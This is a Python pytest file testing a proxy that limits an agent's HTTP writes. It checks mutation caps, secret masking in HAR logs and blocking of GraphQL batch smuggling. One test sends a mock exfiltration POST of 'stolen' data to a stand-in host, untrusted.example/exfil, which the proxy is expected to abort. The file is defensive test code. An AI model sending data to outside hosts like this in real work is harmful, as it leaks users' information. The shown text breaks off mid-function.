"""Real-store multi-threaded tests for ``openadapt_flow.tx.wire_tap``."""

from __future__ import annotations

import ast
import gzip
import http.client
import json
import sqlite3
import subprocess
import sys
import textwrap
import threading
import time
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Callable, Optional
from urllib.parse import parse_qs, quote_plus, urlsplit

import pytest

from openadapt_flow.tx.types import WireTapProtocol, canonical_sha256
from openadapt_flow.tx.wire_tap import (
    HAR_VERSION,
    SessionWireTap,
    WirePolicy,
    dump_har,
    har_to_summary,
    load_har,
)
from openadapt_flow.wire_check import secret_forms

WIRE_TAP_PATH = (
    Path(__file__).resolve().parents[1] / "openadapt_flow" / "tx" / "wire_tap.py"
)

FORBIDDEN_APP_NAMES = (
    "openemr",
    "medplum",
    "vikunja",
    "dolibarr",
    "openimis",
    "espocrm",
    "nocodb",
)

FORBIDDEN_IMPORT_ROOTS = frozenset(
    {
        "numpy",
        "cv2",
        "PIL",
        "rapidocr_onnxruntime",
        "onnxruntime",
        "playwright",
        "torch",
        "scipy",
        "matplotlib",
    }
)


class _SQLiteRecordStore:
    """Thread-safe real SQLite store supporting 10,000+ rows and concurrent writers."""

    def __init__(self, db_path: Path) -> None:
        self.db_path = db_path
        self._write_lock = threading.Lock()
        self._init_schema()

    def _connect(self) -> sqlite3.Connection:
        conn = sqlite3.connect(str(self.db_path), timeout=15.0, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA synchronous=NORMAL")
        conn.execute("PRAGMA busy_timeout=15000")
        return conn

    def _init_schema(self) -> None:
        conn = self._connect()
        try:
            with conn:
                conn.execute(
                    """
                    CREATE TABLE IF NOT EXISTS records (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        name TEXT NOT NULL,
                        category TEXT NOT NULL,
                        value TEXT NOT NULL,
                        actor TEXT NOT NULL,
                        version INTEGER NOT NULL DEFAULT 1
                    )
                    """
                )
                conn.execute(
                    "CREATE INDEX IF NOT EXISTS idx_records_actor ON records(actor)"
                )
        finally:
            conn.close()

    def seed_rows(self, count: int) -> None:
        rows = [
            (i, f"item-{i}", f"cat-{i % 10}", f"val-{i}", "seed", 1)
            for i in range(1, count + 1)
        ]
        with self._write_lock:
            conn = self._connect()
            try:
                with conn:
                    conn.executemany(
                        """
                        INSERT INTO records (id, name, category, value, actor, version)
                        VALUES (?, ?, ?, ?, ?, ?)
                        """,
                        rows,
                    )
            finally:
                conn.close()

    def get_row(self, row_id: int) -> Optional[dict[str, Any]]:
        conn = self._connect()
        try:
            cur = conn.execute(
                "SELECT id, name, category, value, actor, version FROM records WHERE id = ?",
                (row_id,),
            )
            row = cur.fetchone()
            if row is None:
                return None
            ver = int(row["version"])
            return {
                "id": str(row["id"]),
                "name": row["name"],
                "category": row["category"],
                "value": row["value"],
                "actor": row["actor"],
                "version": ver,
                "meta": {"versionId": str(ver)},
            }
        finally:
            conn.close()

    def list_rows(self, limit: int = 10) -> list[dict[str, Any]]:
        conn = self._connect()
        try:
            cur = conn.execute(
                "SELECT id, name, category, value, actor, version FROM records ORDER BY id LIMIT ?",
                (limit,),
            )
            return [
                {
                    "id": str(r["id"]),
                    "name": r["name"],
                    "category": r["category"],
                    "value": r["value"],
                    "actor": r["actor"],
                    "version": int(r["version"]),
                }
                for r in cur.fetchall()
            ]
        finally:
            conn.close()

    def create_row(
        self,
        *,
        name: str,
        category: str = "general",
        value: str = "",
        actor: str = "agent",
    ) -> dict[str, Any]:
        with self._write_lock:
            conn = self._connect()
            try:
                with conn:
                    cur = conn.execute(
                        """
                        INSERT INTO records (name, category, value, actor, version)
                        VALUES (?, ?, ?, ?, 1)
                        """,
                        (name, category, value, actor),
                    )
                    new_id = int(cur.lastrowid or 0)
                return {
                    "id": str(new_id),
                    "name": name,
                    "category": category,
                    "value": value,
                    "actor": actor,
                    "version": 1,
                    "meta": {"versionId": "1"},
                }
            finally:
                conn.close()

    def update_row(
        self,
        row_id: int,
        *,
        name: Optional[str] = None,
        value: Optional[str] = None,
        actor: str = "agent",
    ) -> Optional[dict[str, Any]]:
        with self._write_lock:
            conn = self._connect()
            try:
                cur = conn.execute(
                    "SELECT id, name, category, value, actor, version FROM records WHERE id = ?",
                    (row_id,),
                )
                existing = cur.fetchone()
                if existing is None:
                    return None
                next_name = name if name is not None else str(existing["name"])
                next_val = value if value is not None else str(existing["value"])
                next_ver = int(existing["version"]) + 1
                with conn:
                    conn.execute(
                        """
                        UPDATE records
                        SET name = ?, value = ?, actor = ?, version = ?
                        WHERE id = ?
                        """,
                        (next_name, next_val, actor, next_ver, row_id),
                    )
                return {
                    "id": str(row_id),
                    "name": next_name,
                    "category": str(existing["category"]),
                    "value": next_val,
                    "actor": actor,
                    "version": next_ver,
                    "meta": {"versionId": str(next_ver)},
                }
            finally:
                conn.close()

    def delete_row(self, row_id: int) -> bool:
        with self._write_lock:
            conn = self._connect()
            try:
                with conn:
                    cur = conn.execute("DELETE FROM records WHERE id = ?", (row_id,))
                    return cur.rowcount > 0
            finally:
                conn.close()

    def count_by_actor(self, actor: str) -> int:
        conn = self._connect()
        try:
            cur = conn.execute(
                "SELECT COUNT(*) FROM records WHERE actor = ?",
                (actor,),
            )
            return int(cur.fetchone()[0])
        finally:
            conn.close()


class _UpstreamHTTPServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, store: _SQLiteRecordStore) -> None:
        self.store = store
        self._log_lock = threading.Lock()
        self.received_requests: list[tuple[str, str]] = []
        super().__init__(("127.0.0.1", 0), _UpstreamRequestHandler)

    def record_hit(self, method: str, path: str) -> None:
        with self._log_lock:
            self.received_requests.append((method, path))


class _UpstreamRequestHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt: str, *args: Any) -> None:
        return

    def _read_body(self) -> bytes:
        cl = int(self.headers.get("Content-Length") or "0")
        return self.rfile.read(cl) if cl > 0 else b""

    def _send_json(
        self,
        status: int,
        payload: Optional[dict[str, Any]],
        *,
        extra_headers: Optional[dict[str, str]] = None,
        head_only: bool = False,
    ) -> None:
        self.close_connection = True
        body = (
            json.dumps(payload, separators=(",", ":")).encode("utf-8")
            if payload is not None
            else b""
        )
        self.send_response(status)
        self.send_header("Connection", "close")
        if extra_headers:
            for k, v in extra_headers.items():
                self.send_header(k, v)
        if status == 204:
            self.end_headers()
            return
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if body and not head_only:
            self.wfile.write(body)

    def _dispatch(self, *, head_only: bool = False) -> None:
        srv: _UpstreamHTTPServer = self.server  # type: ignore[assignment]
        srv.record_hit(self.command, self.path)
        parts = urlsplit(self.path)
        path = parts.path.rstrip("/") or "/"
        query = parse_qs(parts.query)
        raw_body = self._read_body()

        if self.command == "OPTIONS":
            self._send_json(
                204,
                None,
                extra_headers={"Allow": "GET, HEAD, OPTIONS, POST, PUT, PATCH, DELETE"},
            )
            return

        if path == "/records" and self.command in ("GET", "HEAD"):
            limit = int(query.get("limit", ["10"])[0])
            items = srv.store.list_rows(limit=limit)
            self._send_json(200, {"items": items}, head_only=head_only)
            return

        if path.startswith("/records/") and self.command in ("GET", "HEAD"):
            seg = path.split("/")[-1]
            if seg.isdigit():
                rec = srv.store.get_row(int(seg))
                if rec is not None:
                    etag = f'"v{rec["version"]}"'
                    self._send_json(
                        200,
                        rec,
                        extra_headers={"ETag": etag},
                        head_only=head_only,
                    )
                    return
            self._send_json(404, {"error": "not_found"}, head_only=head_only)
            return

        if path == "/records" and self.command == "POST":
            data = json.loads(raw_body.decode("utf-8") or "{}")
            created = srv.store.create_row(
                name=str(data.get("name", "created")),
                category=str(data.get("category", "general")),
                value=str(data.get("value", "")),
                actor=str(data.get("actor", "agent")),
            )
            self._send_json(
                201,
                created,
                extra_headers={
                    "Location": f"/records/{created['id']}",
                    "ETag": '"v1"',
                },
            )
            return

        if path == "/records/location-only" and self.command == "POST":
            data = json.loads(raw_body.decode("utf-8") or "{}")
            created = srv.store.create_row(
                name=str(data.get("name", "loc-created")),
                value=str(data.get("value", "")),
                actor="agent",
            )
            self._send_json(
                201,
                {},
                extra_headers={
                    "Location": f"/records/{created['id']}",
                    "ETag": '"v1"',
                },
            )
            return

        if path.startswith("/records/") and self.command in ("PUT", "PATCH"):
            row_id = int(path.split("/")[-1])
            data = json.loads(raw_body.decode("utf-8") or "{}")
            updated = srv.store.update_row(
                row_id,
                name=data.get("name"),
                value=data.get("value"),
                actor=str(data.get("actor", "agent")),
            )
            if updated is None:
                self._send_json(404, {"error": "not_found"})
                return
            etag = f'"v{updated["version"]}"'
            if query.get("no_content") == ["1"]:
                self._send_json(204, None, extra_headers={"ETag": etag})
            else:
                self._send_json(200, updated, extra_headers={"ETag": etag})
            return

        if path.startswith("/records/") and self.command == "DELETE":
            row_id = int(path.split("/")[-1])
            deleted = srv.store.delete_row(row_id)
            if not deleted:
                self._send_json(404, {"error": "not_found"})
                return
            self._send_json(204, None)
            return

        if path == "/graphql" and self.command == "POST":
            payload = json.loads(raw_body.decode("utf-8") or "{}")
            if isinstance(payload, list):
                results = [self._exec_gql(srv.store, item) for item in payload]
                self._send_json(200, {"batch": results})
                return
            gql_resp, etag_hdr = self._exec_gql_with_etag(srv.store, payload)
            extra = {"ETag": etag_hdr} if etag_hdr else None
            self._send_json(200, gql_resp, extra_headers=extra)
            return

        self._send_json(404, {"error": "route_not_found"})

    @staticmethod
    def _exec_gql_with_etag(
        store: _SQLiteRecordStore, payload: dict[str, Any]
    ) -> tuple[dict[str, Any], Optional[str]]:
        q = str(payload.get("query") or "").strip()
        if "mutation" in q:
            updated = store.update_row(42, value="updated-via-graphql", actor="agent")
            assert updated is not None
            etag = f'"v{updated["version"]}"'
            return (
                {
                    "data": {
                        "updatePatient": {
                            "id": updated["id"],
                            "value": updated["value"],
                            "version": updated["version"],
                        }
                    }
                },
                etag,
            )
        rec = store.get_row(42)
        return ({"data": {"patient": rec}}, None)

    @classmethod
    def _exec_gql(
        cls, store: _SQLiteRecordStore, payload: dict[str, Any]
    ) -> dict[str, Any]:
        resp, _ = cls._exec_gql_with_etag(store, payload)
        return resp

    def do_GET(self) -> None:
        self._dispatch(head_only=False)

    def do_HEAD(self) -> None:
        self._dispatch(head_only=True)

    def do_OPTIONS(self) -> None:
        self._dispatch()

    def do_POST(self) -> None:
        self._dispatch()

    def do_PUT(self) -> None:
        self._dispatch()

    def do_PATCH(self) -> None:
        self._dispatch()

    def do_DELETE(self) -> None:
        self._dispatch()


@dataclass
class _RunningUpstream:
    store: _SQLiteRecordStore
    server: _UpstreamHTTPServer
    thread: threading.Thread
    base_url: str


@pytest.fixture()
def upstream_app(tmp_path: Path) -> Any:
    store = _SQLiteRecordStore(tmp_path / "upstream_app.sqlite")
    server = _UpstreamHTTPServer(store)
    host, port = server.server_address[:2]
    base_url = f"http://{host}:{port}"
    thread = threading.Thread(
        target=server.serve_forever,
        kwargs={"poll_interval": 0.02},
        daemon=True,
    )
    thread.start()
    try:
        yield _RunningUpstream(
            store=store,
            server=server,
            thread=thread,
            base_url=base_url,
        )
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2.0)


def _http_call(
    base_url: str,
    method: str,
    path: str,
    *,
    body: Optional[dict[str, Any] | list[Any] | str] = None,
    headers: Optional[dict[str, str]] = None,
) -> tuple[int, dict[str, str], bytes]:
    parts = urlsplit(base_url)
    conn = http.client.HTTPConnection(
        parts.hostname or "127.0.0.1", parts.port or 80, timeout=10.0
    )
    try:
        req_headers = dict(headers or {})
        raw_body: Optional[bytes] = None
        if isinstance(body, (dict, list)):
            raw_body = json.dumps(body).encode("utf-8")
            req_headers.setdefault("Content-Type", "application/json")
        elif isinstance(body, str):
            raw_body = body.encode("utf-8")
        conn.request(method, path, body=raw_body, headers=req_headers)
        resp = conn.getresponse()
        resp_bytes = resp.read()
        resp_headers = {k.lower(): v for k, v in resp.getheaders()}
        return (resp.status, resp_headers, resp_bytes)
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# 1. O(1) session-scoped write completeness with 10,000 rows + 5 bg writers
# ---------------------------------------------------------------------------


def test_o1_write_completeness_with_10k_rows_and_5_concurrent_writers(
    upstream_app: _RunningUpstream,
) -> None:
    upstream_app.store.seed_rows(10_000)

    stop_bg = threading.Event()
    bg_ready = threading.Barrier(6)
    bg_write_counts = [0] * 5
    bg_errors: list[Exception] = []

    def _background_worker(worker_idx: int) -> None:
        try:
            bg_ready.wait(timeout=5.0)
            step = 0
            while not stop_bg.is_set():
                target_id = (worker_idx * 1000) + (step % 500) + 1
                if target_id != 42:
                    upstream_app.store.update_row(
                        target_id,
                        value=f"bg-{worker_idx}-{step}",
                        actor=f"bg-worker-{worker_idx}",
                    )
                upstream_app.store.create_row(
                    name=f"bg-new-{worker_idx}-{step}",
                    category="background",
                    value="noise",
                    actor=f"bg-worker-{worker_idx}",
                )
                bg_write_counts[worker_idx] += 2
                step += 1
                time.sleep(0.002)
        except Exception as exc:  # pragma: no cover
            bg_errors.append(exc)

    workers = [
        threading.Thread(target=_background_worker, args=(idx,), daemon=True)
        for idx in range(5)
    ]
    for w in workers:
        w.start()

    try:
        bg_ready.wait(timeout=5.0)
        # Let background writers actively churn the 10,000-row table concurrently.
        time.sleep(0.03)

        policy = WirePolicy(max_mutations=1)
        with SessionWireTap(
            upstream_app.base_url, policy=policy, session_id="tx-o1"
        ) as tap:
            assert isinstance(tap, WireTapProtocol)
            assert tap.base_url.startswith("http://127.0.0.1:")
            assert tap.base_url != upstream_app.base_url

            st_opt, _, _ = _http_call(tap.base_url, "OPTIONS", "/records")
            assert st_opt == 204

            st_head, hdr_head, body_head = _http_call(
                tap.base_url, "HEAD", "/records/42"
            )
            assert st_head == 200
            assert body_head == b""
            assert hdr_head.get("etag") == '"v1"'

            st_get, hdr_get, body_get = _http_call(tap.base_url, "GET", "/records/42")
            assert st_get == 200
            assert hdr_get.get("etag") == '"v1"'
            assert json.loads(body_get)["id"] == "42"

            st_post, hdr_post, body_post = _http_call(
                tap.base_url,
                "POST",
                "/records",
                body={
                    "name": "agent-created-record",
                    "category": "tx",
                    "value": "exact-payload",
                    "actor": "agent",
                },
            )
            assert st_post == 201
            created = json.loads(body_post)
            created_id = created["id"]
            assert int(created_id) > 10_000
            assert hdr_post.get("etag") == '"v1"'

            st_verify, _, body_verify = _http_call(
                tap.base_url,
                "GET",
                f"/records/{created_id}",
            )
            assert st_verify == 200
            assert json.loads(body_verify)["value"] == "exact-payload"

            time.sleep(0.03)
            summary = tap.summary()
    finally:
        stop_bg.set()
        for w in workers:
            w.join(timeout=5.0)

    assert not bg_errors
    assert (
        sum(bg_write_counts) >= 20
    ), "Background writers must actively mutate SQLite concurrently"

    # Zero interference from 10,000 seed rows or 5 concurrent background writers!
    assert summary.session_id == "tx-o1"
    assert summary.total_requests == 5
    assert summary.read_requests == 4
    assert summary.mutations_allowed == 1
    assert summary.mutations_blocked == 0
    assert summary.collateral_mutations == 0
    assert len(summary.mutations) == 1

    mut = summary.mutations[0]
    assert mut.seq == 1
    assert mut.method == "POST"
    assert mut.path == "/records"
    assert mut.response_status == 201
    assert mut.extracted_entity_id == created_id
    assert mut.etag == '"v1"'
    assert mut.version == "1"
    assert mut.blocked is False
    assert mut.block_reason == ""
    assert mut.is_graphql_mutation is False

    expected_sha = canonical_sha256([m.model_dump() for m in summary.mutations])
    assert summary.ledger_sha256 == expected_sha
    assert upstream_app.store.count_by_actor("agent") == 1
    stored = upstream_app.store.get_row(int(created_id))
    assert stored is not None and stored["value"] == "exact-payload"


# ---------------------------------------------------------------------------
# 2. Inline collateral write prevention (max_mutations & allowed_write_routes)
# ---------------------------------------------------------------------------


def test_inline_collateral_write_prevention_max_mutations(
    upstream_app: _RunningUpstream,
) -> None:
    upstream_app.store.seed_rows(100)

    with SessionWireTap(
        upstream_app.base_url, policy=WirePolicy(max_mutations=1)
    ) as tap:
        st1, _, body1 = _http_call(
            tap.base_url,
            "POST",
            "/records",
            body={"name": "authorized", "value": "ok", "actor": "agent"},
        )
        assert st1 == 201
        first_id = json.loads(body1)["id"]

        # Collateral write attempt: DELETE /records/42 must be blocked BEFORE SQLite!
        st2, _, body2 = _http_call(tap.base_url, "DELETE", "/records/42")
        assert st2 == 403
        err2 = json.loads(body2)
        assert err2 == {
            "error": "blocked_by_wire_tap",
            "reason": "max_mutations_exceeded",
        }

        summary = tap.summary()

    # Verify SQLite row 42 was NEVER touched or deleted!
    row_42 = upstream_app.store.get_row(42)
    assert row_42 is not None
    assert row_42["name"] == "item-42"
    assert row_42["version"] == 1
    assert ("DELETE", "/records/42") not in upstream_app.server.received_requests
    assert upstream_app.store.count_by_actor("agent") == 1

    assert summary.mutations_allowed == 1
    assert summary.mutations_blocked == 1
    assert summary.collateral_mutations == 1
    assert len(summary.mutations) == 2
    assert summary.mutations[0].extracted_entity_id == first_id
    assert summary.mutations[0].blocked is False
    assert summary.mutations[1].method == "DELETE"
    assert summary.mutations[1].path == "/records/42"
    assert summary.mutations[1].response_status == 403
    assert summary.mutations[1].blocked is True
    assert summary.mutations[1].block_reason == "max_mutations_exceeded"


def test_inline_collateral_write_prevention_allowed_write_routes_and_reset(
    upstream_app: _RunningUpstream,
) -> None:
    upstream_app.store.seed_rows(100)
    policy = WirePolicy(
        max_mutations=2,
        allowed_write_routes=(
            ("POST", "/records"),
            ("PATCH", "/records/{id}"),
        ),
    )

    with SessionWireTap(upstream_app.base_url, policy=policy) as tap:
        st1, _, _ = _http_call(
            tap.base_url,
            "POST",
            "/records",
            body={"name": "first", "value": "v1", "actor": "agent"},
        )
        assert st1 == 201

        # Even though max_mutations=2 allows a 2nd write, DELETE /records/42 is undeclared!
        st_del, _, body_del = _http_call(tap.base_url, "DELETE", "/records/42")
        assert st_del == 403
        assert json.loads(body_del) == {
            "error": "blocked_by_wire_tap",
            "reason": "undeclared_write_route",
        }

        s1 = tap.summary()
        assert s1.mutations_allowed == 1
        assert s1.mutations_blocked == 1
        assert s1.collateral_mutations == 1
        assert s1.mutations[1].block_reason == "undeclared_write_route"
        assert upstream_app.store.get_row(42) is not None

        # Reset session and execute a declared PATCH /records/{id}
        new_sid = tap.reset_session("patch-session")
        assert new_sid == "patch-session"

        st_patch, _, _ = _http_call(
            tap.base_url,
            "PATCH",
            "/records/42",
            body={"value": "patched-42", "actor": "agent"},
        )
        assert st_patch == 200
        s2 = tap.summary()
        assert s2.session_id == "patch-session"
        assert s2.mutations_allowed == 1
        assert s2.mutations_blocked == 0
        assert s2.collateral_mutations == 0
        assert s2.mutations[0].extracted_entity_id == "42"
        assert s2.mutations[0].etag == '"v2"'
        assert s2.mutations[0].version == "2"


def test_concurrent_mutation_burst_enforces_exact_max_mutations_atomically(
    upstream_app: _RunningUpstream,
) -> None:
    upstream_app.store.seed_rows(50)
    barrier = threading.Barrier(8)
    statuses: list[int] = []
    status_lock = threading.Lock()

    with SessionWireTap(
        upstream_app.base_url, policy=WirePolicy(max_mutations=1)
    ) as tap:

        def _contender(idx: int) -> None:
            barrier.wait(timeout=5.0)
            st, _, _ = _http_call(
                tap.base_url,
                "POST",
                "/records",
                body={"name": f"race-{idx}", "value": "burst", "actor": "race-agent"},
            )
            with status_lock:
                statuses.append(st)

        threads = [threading.Thread(target=_contender, args=(i,)) for i in range(8)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=5.0)

        summary = tap.summary()

    assert sorted(statuses) == [201] + [403] * 7
    assert summary.mutations_allowed == 1
    assert summary.mutations_blocked == 7
    assert summary.collateral_mutations == 7
    assert upstream_app.store.count_by_actor("race-agent") == 1


# ---------------------------------------------------------------------------
# 3. GraphQL POST disambiguation (query -> read, mutation -> state mutation)
# ---------------------------------------------------------------------------


def test_graphql_post_disambiguation(upstream_app: _RunningUpstream) -> None:
    upstream_app.store.seed_rows(100)

    with SessionWireTap(
        upstream_app.base_url, policy=WirePolicy(max_mutations=1)
    ) as tap:
        # 1. Standard GraphQL query POST -> counted as read
        st_q1, _, body_q1 = _http_call(
            tap.base_url,
            "POST",
            "/graphql",
            body={"query": 'query GetPatient { patient(id: "42") { id name } }'},
        )
        assert st_q1 == 200
        assert json.loads(body_q1)["data"]["patient"]["id"] == "42"

        # 2. GraphQL query with leading comment + variables -> still counted as read
        st_q2, _, _ = _http_call(
            tap.base_url,
            "POST",
            "/graphql",
            body={
                "query": "# Fetch record\n  query GetPatient($id: ID!) { patient(id: $id) { id } }",
                "variables": {"id": "42"},
            },
        )
        assert st_q2 == 200

        mid_summary = tap.summary()
        assert mid_summary.read_requests == 2
        assert mid_summary.mutations_allowed == 0
        assert mid_summary.mutations_blocked == 0
        assert len(mid_summary.mutations) == 0

        # 3. GraphQL mutation POST -> counted as mutation with is_graphql_mutation=True
        st_m1, _, body_m1 = _http_call(
            tap.base_url,
            "POST",
            "/graphql",
            body={
                "query": 'mutation UpdatePatient { updatePatient(id: "42", value: "updated") { id version } }'
            },
        )
        assert st_m1 == 200
        assert json.loads(body_m1)["data"]["updatePatient"]["version"] == 2

        # 4. Second GraphQL mutation (via batch smuggling attempt) -> blocked inline!
        st_m2, _, body_m2 = _http_call(
            tap.base_url,
            "POST",
            "/graphql",
            body=[
                {"query": "query GetPatient { patient { id } }"},
                {"query": "mutation UpdatePatient { updatePatient { id } }"},
            ],
        )
        assert st_m2 == 403
        assert json.loads(body_m2)["reason"] == "max_mutations_exceeded"

        summary = tap.summary()

    assert summary.total_requests == 4
    assert summary.read_requests == 2
    assert summary.mutations_allowed == 1
    assert summary.mutations_blocked == 1
    assert summary.collateral_mutations == 1
    assert len(summary.mutations) == 2

    assert summary.mutations[0].is_graphql_mutation is True
    assert summary.mutations[0].blocked is False
    assert summary.mutations[0].extracted_entity_id == "42"
    assert summary.mutations[0].etag == '"v2"'
    assert summary.mutations[0].version == "2"

    assert summary.mutations[1].is_graphql_mutation is True
    assert summary.mutations[1].blocked is True
    assert summary.mutations[1].block_reason == "max_mutations_exceeded"

    row_42 = upstream_app.store.get_row(42)
    assert row_42 is not None and row_42["version"] == 2


# ---------------------------------------------------------------------------
# 4. Secret leak blocking (secret_in_url) + HAR 1.2 export/import masking
# ---------------------------------------------------------------------------


def test_secret_leak_blocking_and_har_export_import_masking(
    upstream_app: _RunningUpstream,
    tmp_path: Path,
) -> None:
    upstream_app.store.seed_rows(50)
    api_secret = "sk-live-super-secret-token-99"
    pw_secret = "p@ss w0rd&key!"
    policy = WirePolicy(
        max_mutations=2,
        secrets=(api_secret, pw_secret),
    )

    with SessionWireTap(upstream_app.base_url, policy=policy) as tap:
        # 1. Raw secret in mutation URL query -> blocked before hitting upstream!
        st_sec_post, _, body_sec_post = _http_call(
            tap.base_url,
            "POST",
            f"/records?api_key={api_secret}",
            body={"name": "leak", "value": "bad"},
        )
        assert st_sec_post == 403
        assert json.loads(body_sec_post) == {
            "error": "blocked_by_wire_tap",
            "reason": "secret_in_url",
        }

        # 2. Form-encoded secret in GET URL query -> also blocked inline!
        encoded_pw = quote_plus(pw_secret)
        st_sec_get, _, body_sec_get = _http_call(
            tap.base_url,
            "GET",
            f"/records/42?auth={encoded_pw}",
        )
        assert st_sec_get == 403
        assert json.loads(body_sec_get)["reason"] == "secret_in_url"
        assert len(upstream_app.server.received_requests) == 0

        # 3. Legitimate read & write carrying secrets in headers/body -> allowed, but scrubbed in HAR!
        st_ok_get, _, _ = _http_call(
            tap.base_url,
            "GET",
            "/records/42",
            headers={"Authorization": f"Bearer {api_secret}"},
        )
        assert st_ok_get == 200

        st_ok_post, _, _ = _http_call(
            tap.base_url,
            "POST",
            "/records",
            headers={"Authorization": f"Bearer {api_secret}"},
            body={"name": "clean-url", "value": f"note:{pw_secret}", "actor": "agent"},
        )
        assert st_ok_post == 201

        summary = tap.summary()
        har = tap.export_har()
        har_file = tmp_path / "session.har"
        dumped_text = dump_har(tap, har_file)

    assert summary.mutations_blocked == 1
    assert summary.mutations_allowed == 1
    assert summary.collateral_mutations == 1
    assert summary.mutations[0].blocked is True
    assert summary.mutations[0].block_reason == "secret_in_url"

    # Validate HAR 1.2 structure
    assert har["log"]["version"] == HAR_VERSION == "1.2"
    entries = har["log"]["entries"]
    assert len(entries) == 4
    for entry in entries:
        assert "startedDateTime" in entry
        assert "request" in entry and "response" in entry and "timings" in entry

    # Verify EVERY encoding of EVERY configured secret is masked in HAR & summary JSON
    serialized_har = json.dumps(har)
    summary_json = summary.model_dump_json()
    for secret in (api_secret, pw_secret):
        for form in secret_forms(secret):
            assert form not in serialized_har
            assert form not in dumped_text
            assert form not in summary_json

    # Round-trip HAR import utilities
    loaded = load_har(har_file)
    assert loaded["log"]["version"] == "1.2"
    assert len(loaded["log"]["entries"]) == 4

    replayed_summary = har_to_summary(
        har_file,
        policy=WirePolicy(max_mutations=5),
        session_id="replayed",
    )
    assert replayed_summary.session_id == "replayed"
    assert replayed_summary.total_requests == 4
    assert replayed_summary.read_requests == 2
    assert replayed_summary.mutations_allowed == 2
    assert replayed_summary.mutations[1].extracted_entity_id == "51"
    assert replayed_summary.mutations[1].etag == '"v1"'


# ---------------------------------------------------------------------------
# 5. Duck-typed attach_playwright_route interception & abort test
# ---------------------------------------------------------------------------


@dataclass
class _DuckRequest:
    url: str
    method: str = "GET"
    headers: dict[str, str] = field(default_factory=dict)
    post_data_buffer: Optional[bytes] = None


@dataclass
class _DuckResponse:
    status: int
    headers: dict[str, str]
    _body: bytes

    def body(self) -> bytes:
        return self._body


class _DuckRoute:
    def __init__(self, request: _DuckRequest, *, use_fetch: bool = False) -> None:
        self.request = request
        self.use_fetch = use_fetch
        self.aborted = False
        self.continued = False
        self.fulfilled = False
        if not use_fetch:
            # Hide fetch/fulfill attributes to exercise plain continue_() path.
            self.fetch = None  # type: ignore[assignment]
            self.fulfill = None  # type: ignore[assignment]

    def abort(self) -> None:
        self.aborted = True

    def _send_upstream(self) -> _DuckResponse:
        parts = urlsplit(self.request.url)
        if parts.scheme not in ("http", "https"):
            return _DuckResponse(status=200, headers={}, _body=b"")
        target = f"{parts.path or '/'}" + (f"?{parts.query}" if parts.query else "")
        raw_hdrs = dict(self.request.headers)
        conn = http.client.HTTPConnection(
            parts.hostname or "127.0.0.1",
            parts.port or 80,
            timeout=10.0,
        )
        try:
            conn.request(
                self.request.method,
                target,
                body=self.request.post_data_buffer,
                headers=raw_hdrs,
            )
            resp = conn.getresponse()
            data = resp.read()
            hdrs = {k: v for k, v in resp.getheaders()}
            return _DuckResponse(status=resp.status, headers=hdrs, _body=data)
        finally:
            conn.close()

    def continue_(self) -> _DuckResponse:
        self.continued = True
        return self._send_upstream()

    def fetch(self) -> _DuckResponse:
        return self._send_upstream()

    def fulfill(self, *, response: _DuckResponse) -> None:
        self.fulfilled = True


class _DuckPage:
    def __init__(self) -> None:
        self.registered_pattern: Optional[str] = None
        self.handler: Optional[Callable[[Any], None]] = None

    def route(self, pattern: str, handler: Callable[[Any], None]) -> None:
        self.registered_pattern = pattern
        self.handler = handler

    def dispatch(self, route_obj: _DuckRoute) -> _DuckRoute:
        assert self.handler is not None
        self.handler(route_obj)
        return route_obj


def test_duck_typed_playwright_route_interception_and_abort(
    upstream_app: _RunningUpstream,
) -> None:
    upstream_app.store.seed_rows(50)

    # Create SessionWireTap WITHOUT starting a proxy server (`with` not entered).
    tap = SessionWireTap(
        upstream_app.base_url,
        policy=WirePolicy(max_mutations=1),
    )
    page = _DuckPage()
    tap.attach_playwright_route(page)
    assert page.registered_pattern == "**/*"
    assert (
        tap._server is None
    ), "attach_playwright_route must not require opening a proxy port"

    # Local scheme about:blank passes straight through uncounted
    r_local = page.dispatch(_DuckRoute(_DuckRequest("about:blank", "GET")))
    assert r_local.continued is True
    assert tap.summary().total_requests == 0

    # Allowed GET via continue_()
    r_get = page.dispatch(
        _DuckRoute(_DuckRequest(f"{upstream_app.base_url}/records/42", "GET"))
    )
    assert r_get.continued is True
    assert r_get.aborted is False

    # Allowed 1st POST via fetch()/fulfill() duck-type path
    post_payload = json.dumps(
        {"name": "browser-created", "value": "from-route", "actor": "browser"}
    ).encode("utf-8")
    r_post = page.dispatch(
        _DuckRoute(
            _DuckRequest(
                f"{upstream_app.base_url}/records",
                "POST",
                headers={"Content-Type": "application/json"},
                post_data_buffer=post_payload,
            ),
            use_fetch=True,
        )
    )
    assert r_post.fulfilled is True
    assert r_post.aborted is False

    # Blocked 2nd mutation (DELETE /records/42) -> aborted before hitting SQLite!
    r_del = page.dispatch(
        _DuckRoute(_DuckRequest(f"{upstream_app.base_url}/records/42", "DELETE"))
    )
    assert r_del.aborted is True
    assert r_del.continued is False
    assert upstream_app.store.get_row(42) is not None

    # Blocked cross-origin exfiltration POST -> aborted with disallowed_origin!
    r_cross = page.dispatch(
        _DuckRoute(
            _DuckRequest(
                "http://untrusted.example:9999/exfil",
                "POST",
                post_data_buffer=b'{"stolen":true}',
            )
        )
    )
    assert r_cross.aborted is True
    assert r_cross.continued is False

    summary = tap.summary()
    assert summary.total_requests == 4
    assert summary.read_requests == 1
    assert summary.mutations_allowed == 1
    assert summary.mutations_blocked == 2
    assert summary.collateral_mutations == 2
    assert summary.mutations[0].extracted_entity_id == "51"
    assert summary.mutations[0].etag == '"v1"'
    assert summary.mutations[1].blocked is True
    assert summary.mutations[1].block_reason == "max_mutations_exceeded"
    assert summary.mutations[2].blocked is True
    assert summary.mutations[2].block_reason == "disallowed_origin"


# ---------------------------------------------------------------------------
# 6. Extraction fallbacks + Generality & Import-boundary gates
# ---------------------------------------------------------------------------


def test_location_header_url_segment_and_programmatic_record_exchange(
    upstream_app: _RunningUpstream,
